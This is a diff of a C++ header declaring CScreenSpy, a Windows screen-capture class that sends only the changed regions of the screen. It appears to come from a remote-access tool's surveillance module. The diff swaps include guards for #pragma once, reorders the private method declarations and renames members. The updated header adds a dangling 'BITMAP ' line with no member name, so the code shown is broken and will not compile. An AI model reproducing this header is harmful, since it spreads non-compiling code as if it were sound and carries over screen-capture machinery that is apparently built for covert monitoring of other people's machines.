@@ -1,14 +1,7 @@
-// ScreenSpy.h: interface for the CScreenSpy class.
-//
-//////////////////////////////////////////////////////////////////////
+#pragma once
 
-#if !defined(AFX_SCREENSPY_H__6600B30F_A7E3_49D4_9DE6_9C35E71CE3EE__INCLUDED_)
-#define AFX_SCREENSPY_H__6600B30F_A7E3_49D4_9DE6_9C35E71CE3EE__INCLUDED_
 #include <windows.h>
 #include "CursorInfo.h"
-#if _MSC_VER > 1000
-#pragma once
-#endif // _MSC_VER > 1000
 
 // 两种算法
 #define ALGORITHM_SCAN	1	// 速度很快，但碎片太多
@@ -19,16 +12,27 @@ class CScreenSpy
 public:
 	CScreenSpy(int biBitCount= 8, bool bIsGray= false, UINT nMaxFrameRate = 100);
 	virtual ~CScreenSpy();
+
 	LPVOID getFirstScreen();
 	LPVOID getNextScreen(LPDWORD lpdwBytes);
 
-	void setAlgorithm(UINT nAlgorithm);
 	LPBITMAPINFO getBI();
+	BITMAP 
 	UINT	getBISize();
 	UINT	getFirstImageSize();
 	void	setCaptureLayer(bool bIsCaptureLayer);
+	void setAlgorithm(UINT nAlgorithm);
+
 private:
-	BYTE m_bAlgorithm;
+	void ScanScreen(HDC hdcDest, HDC hdcSrc, int nWidth, int nHeight); // 降低CPU
+	int Compare(LPBYTE lpSource, LPBYTE lpDest, LPBYTE lpBuffer, DWORD dwSize);
+	LPBITMAPINFO ConstructBI(int biBitCount, int biWidth, int biHeight);
+	void WriteRectBuffer(LPBYTE	lpData, int nCount);
+	bool ScanChangedRect(int nStartLine);
+	void CopyRect(LPRECT lpRect);
+	bool SelectInputWinStation();
+
+	BYTE m_byAlgorithm;
 	UINT m_nMaxFrameRate;
 	bool m_bIsGray;
 	DWORD m_dwBitBltRop;
@@ -40,10 +44,12 @@ private:
 	int m_nFullWidth, m_nFullHeight, m_nStartLine;
 	RECT m_changeRect;
 	HDC m_hFullDC, m_hLineMemDC, m_hFullMemDC, m_hRectMemDC;
+	
 	HBITMAP m_hLineBitmap, m_hFullBitmap;
 	LPVOID m_lpvLineBits, m_lpvFullBits;
 	LPBITMAPINFO m_lpbmi_line, m_lpbmi_full, m_lpbmi_rect;
-	int	m_biBitCount;
+	
+	int	m_nbiBitCount;
 	int	m_nDataSizePerLine;
 
 	LPVOID m_lpvDiffBits; // 差异比较的下一张
@@ -51,14 +57,5 @@ private:
 	HBITMAP	m_hDiffBitmap;
 
 	CCursorInfo	m_CursorInfo;
-	void ScanScreen(HDC hdcDest, HDC hdcSrc, int nWidth, int nHeight); // 降低CPU
-	int Compare(LPBYTE lpSource, LPBYTE lpDest, LPBYTE lpBuffer, DWORD dwSize);
-	LPBITMAPINFO ConstructBI(int biBitCount, int biWidth, int biHeight);
-	void WriteRectBuffer(LPBYTE	lpData, int nCount);
-	bool ScanChangedRect(int nStartLine);
-	void CopyRect(LPRECT lpRect);
-	bool SelectInputWinStation();
 	HWND m_hDeskTopWnd;
 };
-
-#endif // !defined(AFX_SCREENSPY_H__6600B30F_A7E3_49D4_9DE6_9C35E71CE3EE__INCLUDED_)
